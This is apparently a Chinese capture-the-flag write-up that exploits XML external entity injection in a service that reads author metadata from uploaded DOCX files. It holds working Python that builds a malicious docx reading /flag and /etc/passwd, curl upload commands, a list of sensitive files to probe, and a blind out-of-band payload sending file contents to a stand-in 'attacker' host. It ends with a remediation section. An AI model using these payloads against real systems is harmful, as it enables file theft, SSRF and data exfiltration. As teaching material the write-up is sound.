+用 `python-docx` 造一份正常简历，作者写 `Alice`：
+
+```python
+from docx import Document
+d = Document()
+d.add_paragraph("hello resume")
+d.core_properties.author = "Alice"
+d.core_properties.title = "Test Title"
+d.core_properties.subject = "Test Subject"
+d.core_properties.comments = "Test Comments"
+d.save("test.docx")
+```
+
+上传：
+
+```bash
+curl -F "file=@test.docx;type=application/vnd.openxmlformats-officedocument.wordprocessingml.document" \
+  'http://.../'
+```
+
+```html
+<div class="result-box">成功提取简历作者信息：Alice</div>
+```
+
+![正常上传，作者被回显](./images/weekly/image-66.png)
+
+这一步确认了三件事：
+
+1. 服务端确实解析 DOCX，并且读的是 **core properties**；
+2. 只取 **author / creator** 一个字段；
+3. **返回值直接拼进 HTML**，没有过滤。
+
+<font color="red">第 3 条是关键：有回显 = 不需要盲打，XXE 能直接读出来。</font>
+
+> **名词：core properties（文档属性）** —— Word 里“文件 → 信息”那一栏：标题、作者、主题、备注、修订号。它们在 docx 包里是单独一个 XML。
+
+---
+
+### 4.docx 的结构
+
+DOCX / OOXML 就是个 ZIP 包。一个最小 docx：
+
+| 条目 | 作用 |
+|---|---|
+| `[Content_Types].xml` | 声明每种部件的类型 |
+| `_rels/.rels` | 包级关系，指向主文档 |
+| `word/document.xml` | 正文 |
+| `docProps/core.xml` | **元数据（作者、标题、主题、备注）** |
+| `docProps/app.xml` | 应用程序信息（公司、管理器等） |
+
+`docProps/core.xml` 长这样：
+
+```xml
+<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
+<cp:coreProperties
+    xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
+    xmlns:dc="http://purl.org/dc/elements/1.1/"
+    xmlns:dcterms="http://purl.org/dc/terms/"
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <dc:title>Test Title</dc:title>
+  <dc:subject>Test Subject</dc:subject>
+  <dc:creator>Alice</dc:creator>
+  <dc:description>Test Comments</dc:description>
+</cp:coreProperties>
+```
+
+页面上的“简历作者”就是 `<dc:creator>`。服务端读 `core_properties.author` 时，**必然要解析这个 XML**——这就是注入点。
+
+> **名词：OOXML** —— Office 从 2007 起的格式标准，本质是「ZIP + 一堆 XML」。所以 docx/xlsx/pptx 里的任何 XML 部件，只要能塞进去，就有机会被解析。
+
+---
+
+### 5.XXE 原理
+
+XML 允许在 DTD 里声明实体：
+
+```xml
+<!DOCTYPE cp:coreProperties [
+  <!ENTITY xxe SYSTEM "file:///flag">
+]>
+```
+
+然后在文档里引用：
+
+```xml
+<dc:creator>&xxe;</dc:creator>
+```
+
+如果解析器允许外部实体，`&xxe;` 会被替换成 `/flag` 的内容：
+
+```text
+① 解析 DTD，读到 <!ENTITY xxe SYSTEM "file:///flag">
+② 展开 &xxe;，去读 file:///flag
+③ 读到的字节填进 <dc:creator>
+④ 服务端取 author → 拿到 flag 字符串
+⑤ 页面把作者名原样回显
+```
+
+打不通的情况：解析器设了 `resolve_entities=False`、禁了 DTD，或者用了 `defusedxml`。这题显然没有。
+
+> **名词：DTD** —— 文档类型定义，XML 开头那段 `<!DOCTYPE ...>`，用来声明元素和实体。**外部实体就是在 DTD 里声明“去读一个外部资源”的实体。**
+>
+> **名词：XXE / CWE-611** —— XML External Entity，XML 外部实体注入；CWE-611 是它的官方编号（Improper Restriction of XML External Entity Reference）。
+
+---
+
+### 6.造恶意 docx
+
+核心思路：拿正常 `test.docx` 当模板，**只替换 `docProps/core.xml`**，其他 ZIP 条目原封不动。这样它仍是一个合法 OOXML 包，服务端能正常打开，只是在解析 core.xml 时触发实体。
+
+```python
+import zipfile
+
+src = "test.docx"
+dst = "xxe_flag.docx"
+uri = "file:///flag"
+
+core = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE cp:coreProperties [
+  <!ENTITY xxe SYSTEM "{uri}">
+]>
+<cp:coreProperties
+  xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
+  xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <dc:title>XXE</dc:title>
+  <dc:creator>&xxe;</dc:creator>
+  <dc:description>XXE</dc:description>
+  <cp:revision>1</cp:revision>
+</cp:coreProperties>'''.encode()
+
+with zipfile.ZipFile(src) as zin, zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED) as zout:
+    for item in zin.infolist():
+        data = core if item.filename == "docProps/core.xml" else zin.read(item.filename)
+        zout.writestr(item, data)
+```
+
+四个要点：
+
+| 要点 | 说明 |
+|---|---|
+| `<!DOCTYPE ...>` 位置 | 必须在根元素 `<cp:coreProperties>` **之前** |
+| 实体名 | `xxe` 随便叫，但要和引用处一致 |
+| `SYSTEM "file:///flag"` | 本地文件读取；换成 `http://` 就是 SSRF |
+| 引用点 | 必须是 `<dc:creator>&xxe;</dc:creator>`，因为服务端只取 author |
+
+![docProps/core.xml 注入外部实体](./images/weekly/image-67.png)
+
+---
+
+### 7.上传拿 flag
+
+```bash
+curl -F "file=@xxe_flag.docx;type=application/vnd.openxmlformats-officedocument.wordprocessingml.document" \
+  'http://.../'
+```
+
+```html
+<div class="result-box">成功提取简历作者信息：SYC{f08e4d41-2fb5-4f8f-bd86-fb27936d4db3}</div>
+```
+
+![上传后直接回显 flag](./images/weekly/image-68.png)
+
+<font color="red">这道题不用盲打 OOB：元数据解析结果被原样反射，所以我们读什么、页面就回显什么。</font>
+
+---
+
+### 8.读 passwd 验证
+
+把 `uri` 换成 `file:///etc/passwd`，同样能读：
+
+```text
+成功提取简历作者信息：root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+```
+
+<font color="red">这一步是“确认漏洞性质”：不是 `/flag` 被特判，而是**通用的 XML 外部实体文件读取**。</font>
+
+flag 路径未知时的探测顺序：
+
+| 文件 | 能拿到什么 |
+|---|---|
+| `/etc/passwd` | 用户与 shell，确认能读 |
+| `/proc/self/environ` | 进程环境变量，**很多题的 FLAG 就在这** |
+| `/proc/self/cmdline` | 启动命令，看工作目录和入口 |
+| `/app/*`、`/flag`、`/flag.txt` | 常见 flag 位置 |
+
+---
+
+### 9.为什么只读元数据更危险
+
+开发者常见的错觉是：
+
+> 我只读元数据、不读正文，应该很安全。
+
+但元数据本身就是 XML：
+
+```text
+docx (ZIP)
+  └─ docProps/core.xml (XML)
+       └─ <dc:creator> ... </dc:creator>
+```
+
+**只要解析 XML，就要面对 XXE。** “只读元数据”只是缩小了业务范围，没有改变「不可信 XML 进入解析器」这个事实。反而因为元数据解析通常交给通用 OOXML 库，最容易被忽略。
+
+完整链路：
+
+```text
+用户上传 .docx
+  → 服务端解 ZIP
+  → 解析 docProps/core.xml
+  → XML 解析器展开外部实体
+  → 读取 file:///flag
+  → 取 dc:creator
+  → 拼进 HTML 返回
+```
+
+根因两条：
+
+1. **XML 解析器允许外部实体 / DTD**（CWE-611）；
+2. **不可信输入（上传文件）直接进 XML 解析**，而且解析结果被反射。
+
+---
+
+### 10.盲 XXE 与其他打法
+
+这题回显，所以没走盲打。但同一种洞在不回显时也能打成，思路记一下：
+
+**盲 XXE / OOB**（把内容带外发到自己的服务器）：
+
+```xml
+<!ENTITY % file SYSTEM "file:///flag">
+<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
+%dtd;
+```
+
+`evil.dtd`：
+
+```xml
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker/?x=%file;'>">
+%all;
+```
+
+再在 `dc:creator` 里引用 `&send;`。
+
+> **名词：OOB（Out-of-Band）** —— 不回显时，让目标主动向攻击者发起请求，把数据藏在 URL 里带出来。
+
+其他利用方向：
+
+| 方向 | 做法 | 用途 |
+|---|---|---|
+| SSRF | 把 `file:///flag` 换成 `http://127.0.0.1:5000/...` 或内网地址 | 探内网、云元数据 |
+| 拒绝服务 | Billion Laughs 实体递归膨胀 | 耗尽内存（CTF 不这么打，真实环境是风险） |
+| 换解析点 | `docProps/app.xml` 的 `Company`/`Manager`、`customXml/item1.xml`、`_rels/.rels` | 作者字段不可控时换入口 |
+
+---
+
+### 11.修复建议
+
+| # | 做法 |
+|---|---|
+| 1 | 解析器显式禁用外部实体与 DTD：`etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)`，或用 `defusedxml` |
+| 2 | 不要用默认 `lxml.etree.fromstring` 解析上传文件里的 XML |
+| 3 | 校验 docx 结构：只允许预期的 ZIP 条目，拒绝带 `DOCTYPE` 的 XML |
+| 4 | 元数据不要直接拼 HTML，至少做转义（顺带防 XSS） |
+| 5 | 在低权限容器里解析文档，敏感文件（`/flag`、`/proc/self/environ`、云元数据）不可读 |
+| 6 | 只需要作者名时，用受限解析器只读 `dc:creator`，别把整个 OOXML 包丢给通用解析器 |
+
+---
+
+### 12.XXE 知识点小结
+
+| 考点 | 要点 |
+|---|---|
+| 公告读法 | “只读元数据”= 去盯 `docProps/core.xml` |
+| DOCX 结构 | ZIP + XML，元数据单独一个部件 |
+| 回显点 | 服务端取 `author` → 页面原样输出，等于自带数据出口 |
+| XXE 构造 | `DOCTYPE` 声明实体 + `&xxe;` 引用；`DOCTYPE` 必须在根元素前 |
+| 打包细节 | 只换 `core.xml`，其余条目原样保留，包才合法 |
+| 性质确认 | 能读 `/etc/passwd` → 通用文件读取，不是 `/flag` 特判 |
+| 不回显时 | 盲 XXE / OOB：参数实体 + 外部 DTD 把内容带出 |
+| 根因 | CWE-611：允许外部实体；不可信 XML 进解析器且结果被反射 |
+
+**一句话总结**：<font color="red">它不是“文件上传漏洞”，是**“上传的文件里有一段 XML，而那段 XML 被一个没设防的解析器读了”**——只改一个作者字段，flag 就从“作者名”里出来了。</font>
+
+```text
+SYC{f08e4d41-2fb5-4f8f-bd86-fb27936d4db3}
+```
+
